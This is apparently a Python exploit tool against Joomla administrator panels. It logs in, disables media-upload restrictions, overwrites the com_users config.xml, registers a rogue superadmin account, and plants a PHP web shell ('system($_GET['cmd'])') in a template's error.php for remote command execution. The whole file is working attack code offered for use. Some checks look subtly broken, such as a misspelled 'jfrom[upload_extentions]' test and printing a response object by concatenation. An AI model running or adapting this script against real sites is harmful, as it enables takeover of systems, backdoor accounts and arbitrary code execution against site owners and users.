#!/usr/bin/env python3
import re
import sys
import requests
import lxml.html
import argparse

#proxies = {"http": "http://127.0.0.1:8080",
#           "https": "https://127.0.0.1:8080"}   # For debug on proxy.

proxies = {}

def config_file(filename):
    print('\033[33m[*] Creating config.xml ...\033[0m')
    content = """<?xml version="1.0" encoding="utf-8"?>
<config>
	<fieldset 
		name="user_options"
		label="COM_USERS_CONFIG_USER_OPTIONS" >
		<field
			name="allowUserRegistration"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL"
			description="COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
		<field
			name="new_usertype"
			type="usergrouplist"
			label="COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL"
			description="COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC"
			default="2"
			checksuperusergroup="0"
		/>
		<field
			name="guest_usergroup"
			type="usergrouplist"
			label="COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL"
			description="COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC"
			default="1"
			checksuperusergroup="0"
		/>
		<field
			name="sendpassword"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL"
			description="COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
		<field
			name="useractivation"
			type="list"
			label="COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL"
			description="COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC"
			default="0"
			>
			<option value="0">JNONE</option>
			<option value="1">COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION</option>
			<option value="2">COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION</option>
		</field>
		<field
			name="mail_to_admin"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL"
			description="COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC"
			class="btn-group btn-group-yesno"
			default="0"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
		<field
			name="captcha"
			type="plugins"
			label="COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL"
			description="COM_USERS_CONFIG_FIELD_CAPTCHA_DESC"
			folder="captcha"
			filter="cmd"
			useglobal="true"
			>
			<option value="0">JOPTION_DO_NOT_USE</option>
		</field>
		<field
			name="frontend_userparams"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL"
			description="COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JSHOW</option>
			<option value="0">JHIDE</option>
		</field>
		<field
			name="site_language"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL"
			description="COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC"
			class="btn-group btn-group-yesno"
			default="0"
			showon="frontend_userparams:1"
			>
			<option value="1">JSHOW</option>
			<option value="0">JHIDE</option>
		</field>
		<field
			name="change_login_name"
			type="radio"
			label="COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL"
			description="COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC"
			class="btn-group btn-group-yesno"
			default="0"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
	</fieldset>
	<fieldset
		name="domain_options"
		label="COM_USERS_CONFIG_DOMAIN_OPTIONS"
		>
		<field
			name="domains"
			type="subform"
			label="COM_USERS_CONFIG_FIELD_DOMAINS_LABEL"
			description="COM_USERS_CONFIG_FIELD_DOMAINS_DESC"
			multiple="true"
			layout="joomla.form.field.subform.repeatable-table"
			formsource="administrator/components/com_users/models/forms/config_domain.xml"
		/>
	</fieldset>
	<fieldset
		name="password_options"
		label="COM_USERS_CONFIG_PASSWORD_OPTIONS" >
		<field
			name="reset_count"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL"
			description="COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC"
			first="0"
			last="20"
			step="1"
			default="10"
		/>
		<field
			name="reset_time"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_LABEL"
			description="COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_DESC"
			first="1"
			last="24"
			step="1"
			default="1"
		/>
		<field
			name="minimum_length"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH"
			description="COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH_DESC"
			first="4"
			last="99"
			step="1"
			default="4"
		/>
		<field
			name="minimum_integers"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS"
			description="COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS_DESC"
			first="0"
			last="98"
			step="1"
			default="0"
		/>
		<field
			name="minimum_symbols"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS"
			description="COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS_DESC"
			first="0"
			last="98"
			step="1"
			default="0"
		/>
		<field
			name="minimum_uppercase"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE"
			description="COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE_DESC"
			first="0"
			last="98"
			step="1"
			default="0"
		/>
		<field
			name="minimum_lowercase"
			type="integer"
			label="COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE"
			description="COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE_DESC"
			first="0"
			last="98"
			step="1"
			default="0"
		/>
	</fieldset>
	<fieldset
		name="user_notes_history"
		label="COM_USERS_CONFIG_FIELD_NOTES_HISTORY" >
		<field
			name="save_history"
			type="radio"
			label="JGLOBAL_SAVE_HISTORY_OPTIONS_LABEL"
			description="JGLOBAL_SAVE_HISTORY_OPTIONS_DESC"
			class="btn-group btn-group-yesno"
			default="0"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
		<field
			name="history_limit"
			type="number"
			label="JGLOBAL_HISTORY_LIMIT_OPTIONS_LABEL"
			description="JGLOBAL_HISTORY_LIMIT_OPTIONS_DESC"
			filter="integer"
			default="5"
			showon="save_history:1"
		/>
	</fieldset>
 	<fieldset
		name="massmail"
		label="COM_USERS_MASS_MAIL"
		description="COM_USERS_MASS_MAIL_DESC">
		<field
 			name="mailSubjectPrefix"
 			type="text"
			label="COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_LABEL"
			description="COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_DESC"
		/>
 		<field
 			name="mailBodySuffix"
			type="textarea"
			label="COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_LABEL"
			description="COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_DESC"
 			rows="5"
 			cols="30"
		/>
	</fieldset>
	<fieldset
		name="debug"
		label="COM_USERS_DEBUG_LABEL"
		description="COM_USERS_DEBUG_DESC">
		<field
			name="debugUsers"
			type="radio"
			label="COM_USERS_DEBUG_USERS_LABEL"
			description="COM_USERS_DEBUG_USERS_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
		<field
			name="debugGroups"
			type="radio"
			label="COM_USERS_DEBUG_GROUPS_LABEL"
			description="COM_USERS_DEBUG_GROUPS_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
	</fieldset>
	<fieldset name="integration"
		label="JGLOBAL_INTEGRATION_LABEL"
		description="COM_USERS_CONFIG_INTEGRATION_SETTINGS_DESC"
	>
		<field
			name="integration_sef"
			type="note"
			label="JGLOBAL_SEF_TITLE"
		/>
		<field
			name="sef_advanced"
			type="radio"
			class="btn-group btn-group-yesno btn-group-reversed"
			default="0"
			label="JGLOBAL_SEF_ADVANCED_LABEL"
			description="JGLOBAL_SEF_ADVANCED_DESC"
			filter="integer"
			>
			<option value="0">JGLOBAL_SEF_ADVANCED_LEGACY</option>
			<option value="1">JGLOBAL_SEF_ADVANCED_MODERN</option>
		</field>
		<field
			name="integration_customfields"
			type="note"
			label="JGLOBAL_FIELDS_TITLE"
		/>
		<field
			name="custom_fields_enable"
			type="radio"
			label="JGLOBAL_CUSTOM_FIELDS_ENABLE_LABEL"
			description="JGLOBAL_CUSTOM_FIELDS_ENABLE_DESC"
			class="btn-group btn-group-yesno"
			default="1"
			>
			<option value="1">JYES</option>
			<option value="0">JNO</option>
		</field>
	</fieldset>
	<fieldset
		name="permissions"
		label="JCONFIG_PERMISSIONS_LABEL"
		description="JCONFIG_PERMISSIONS_DESC"
		>
		<field
			name="rules"
			type="rules"
			label="JCONFIG_PERMISSIONS_LABEL"
			filter="rules"
			validate="rules"
			component="com_users"
			section="component"
		/>
	</fieldset>
</config>
"""

    f = open(filename, "w")
    f.write(content)
    f.close()

def extact_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print('\033[31m[-] Cannot find CSRF token ! \033[0m\n')
        return None
    return match.group(1)

def login(session, url, uname, passwd):
    admin_panel = url + '/administrator/index.php'
    print('\033[32m[+] Getting token for login. \033[0m')
    resp = session.get(admin_panel, verify=True)
    token = extact_token(resp)
    if not token:
        return False
    
    data = {
        'username': uname,
        'passwd': passwd,
        'task': 'login',
        token: '1'
    }

    resp = session.post(admin_panel, data=data, verify=True)
    if 'task=profile.edit' not in resp.text:
        print('\033[31m[-] Admin Login Failure ! \033[0m')
        return None
    print('\033[32m[+] Admin Login Successfully \033[0m')
    return True

def checker(session, url):
    check_url = url + '/administrator/index.php?option=com_config&view=component&component=com_media&path='
    resp = session.get(check_url, verify=True)
    token = extact_token(resp)
    if not token:
        print('\033[31m[-] Not admin account ! \033[0m')
        sys.exit()
    return token

def set_options(url, session, dir, token):
    print('[*] Setting Options ...')
    new_data = {
        'jform[upload_extensions]': 'xml,bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS',
        'jform[upload_maxsize]': 10,
        'jform[file_path]': dir,
        'jform[image_path]': dir,
        'jform[restrict_uploads]': 0,
        'jform[check_mime]': 0,
        'jform[image_extensions]': 'bmp,gif,jpg,png',
        'jform[ignore_extensions]': '',
        'jform[upload_mime]': 'image/jpeg,image/gif,image/png,image/bmp,application/x-shockwave-flash,application/msword,application/excel,application/pdf,application/powerpoint,text/plain,application/x-zip',
        'jform[upload_mime_illegal]': 'text/html',
        'id': 13,
        'component': 'com_media',
        'task': 'config.save.component.apply',
        token: 1
    }

    new_data['task'] = 'config.save.component.apply'
    config_url = url + '/administrator/index.php?option=com_config'
    resp = session.post(config_url, data=new_data, verify=True)
    if 'jfrom[upload_extentions]' not in resp.text:
        print('\033[31m[-] Maybe failed to set options ...')
        return False
    return True

def travelsal(session, url):
    shell = url + '/administrator/index.php?option=com_media&view=mediaList&tmpl=component&folder='
    resp = session.get(shell, verify=True)
    page = resp.text.encode('UTF-8')
    html = lxml.html.fromstring(page)
    files = html.xpath("//input[@name='rm[]']/@value")
    for file in files:
        print(file)
    pass

def remove_file(session, url, filename, token):
    rm_path = url + '/administrator/index.php?option=com_media&task=file.delete&tmpl=index&' + token + '=1&folder=&rm[]=' + filename
    msg = session.get(rm_path, verify=True, proxies=proxies)
    page = msg.text.encode('UTF-8')
    html = lxml.html.fromstring(page)
    rm_file = html.xpath("//div[@class='alert-message']/text()[1]")
    print('\n' + '[Result]: ' + rm_file[-1])

def upload_file(session, url, file, token):
    print('[*] Uploading config.xml')
    filename = "config.xml"
    url = url + '/administrator/index.php?option=com_media&task=file.upload&tmpl=component&' + token + '=1&format=html&folder='
    files = {
        'Filedata[]': (filename, file, 'text/xml')
    }
    
    data = dict(folder="")
    resp = session.post(url, files=files, data=data, verify=True, proxies=proxies)
    if filename not in resp.text:
        print('\033[31m[-] Failed to upload file ! \033[0m')
        return False
    print('\033[32m[+] Exploit Successfully \033[0m')
    return True

def users_options(session, url, token):
    new_data = {
        'jform[allowUserRegistration]': 1,
        'jform[new_usertype]': 8,
        'jform[guest_usergroup]': 8,
        'jform[sendpassword] ': 0,
        'jform[useractivation]': 0,
        'jform[mail_to_admin]': 0,
        'id': 25,
        'component': 'com_users',
        'task': 'config.save.component.apply',
        token: 1
    }

    new_data['task'] = 'config.save.component.apply'
    config_url = url + '/administrator/index.php?option=com_config'
    resp = session.post(config_url, data=new_data, verify=True)
    if 'Configuration saved.' not in resp.text:
        print('\033[31m[-] Couldn\'t save data. Error: Save not permitted. \033[0m')
        return False
    return True

def superuser(session, url, username, password, email):
    resp = session.get(url + "/index.php?option=com_users&view=registration", verify=True)
    token = extact_token(resp)
    data = {
        # Form data
        'jform[name]': username,
        'jform[username]': username,
        'jform[password1]': password,
        'jform[password2]': password,
        'jform[email1]': email,
        'jform[email2]': email,
        'jform[option]': 'com_users',
        'jform[task]': 'registration.register'
    }

    url_post = "/index.php/component/users/?task=registration.register&Itemid=101"
    session.post(url + url_post, data=data, verify=True)
    session.get(url + "/administrator/index.php?option=com_login&task=logout&" + token + "=1", verify=True)
    new_session = requests.Session()
    if login(new_session, url, username, password):
        print("\033[32m[+] Now, Superadmin !" + "\n[+] Superadmin account: \n[+] USERNAME: \033[0m" + username + "\n\033[32m[+] PASSWORD: \033[0m" + password)
        return new_session
    else:
        print('\033[31m[-] Exploit Fail ! \033[0m')
    return None

def Options(url, session, usuper, psuper, esuper, token):
    print('[*] Superadmin Creation:')
    dir = './administrator/components/com_users'
    filename = 'config.xml'
    set_options(url, session, dir, token)
    travelsal(session, url)
    remove_file(session, url, filename, token)
    f = open("config.xml", "rb")
    upload_file(session, url, f, token)
    users_options(session, url, token)

def rce(session, url, cmd, token):
    filename = 'error.php'
    sh_link = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    sh_data_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }

    session.post(sh_link, data=sh_data_up, proxies=proxies)
    path_to_shell = '/templates/protostar/error.php?cmd=' + cmd
    print('[*] Checking ...')
    sh_req = session.get(url + path_to_shell, proxies=proxies)
    sh_resp = sh_req.text
    print(sh_req + '\033[32m[+] Shell link: \n' + (url + path_to_shell))
    print('\033[32m[+] Module finished. \033[0m')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--url", required=True,
                        help="Url's Joomla Target.")
    parser.add_argument("-u", "--username", required=True,
                        help="Username.")
    parser.add_argument("-p", "--password", required=True,
                        help="Password.")
    parser.add_argument("-d", "--directory", required=False, default='./',
                        help="Directory (default='./').")
    parser.add_argument("-rm", "--remove", required=False,
                        help="Remove filename.")
    parser.add_argument("-rce", "--rce", required=False, default="0",
                        help="Remote Code Execution's mode is 1 to turn on (default=0).")
    parser.add_argument("-cmd", "--command", default="whoami",
                        help="Command (default=whoami).")
    parser.add_argument("-usuper", "--usernamesuper", default="superadmin",
                        help="Superadmin's username (default=superadmin).")
    parser.add_argument("-psuper", "--passwordsuper", default="1234",
                        help="Superadmin's password (default=1234).")
    parser.add_argument("-esuper", "--emailsuper",
                        help="Superadmin's email.")
    
    args = vars(parser.parse_args())

    url = format(str(args['url']))
    print('[*] Target Url: ' + url)

    uname = format(str(args['username']))
    upass = format(str(args['password']))
    dir = format(str(args['directory']))
    session = requests.Session()
    if (login(session, url, uname, upass) == None):
        sys.exit()
    
    token = checker(session, url)
    set_options(url, session, dir, token)
    print("[*] Directory mode: ")
    travelsal(session, url)
    if parser.parse_args().remove:
        print('\n[*] Remove file mode: ')
        filename = format(str(args['remove']))
        remove_file(session, url, filename, token)
    
    # Check options for superadmin creation & superadmin's username.
    usuper = format(str(args['usernamesuper']))
    psuper = format(str(args['passwordsuper']))
    esuper = format(str(args['emailsuper']))

    # RCE mode.
    if (format(str(args['rce'])) == "1"):
        print('\n[*] Remote Code Execution (RCE) mode.: ')
        filename = "config.xml"     # Command.
        config_file(filename)
        command = format(str(args['command']))
        Options(url, session, usuper, psuper, esuper, token)

        # Superadmin creation.
        new_session = superuser(session, url, usuper, psuper, esuper)
        if new_session != None:
            new_token = checker(new_session, url)       # Get token.
            rce(new_session, url, command, new_token)

if __name__ == '__main__':
    sys.exit(main())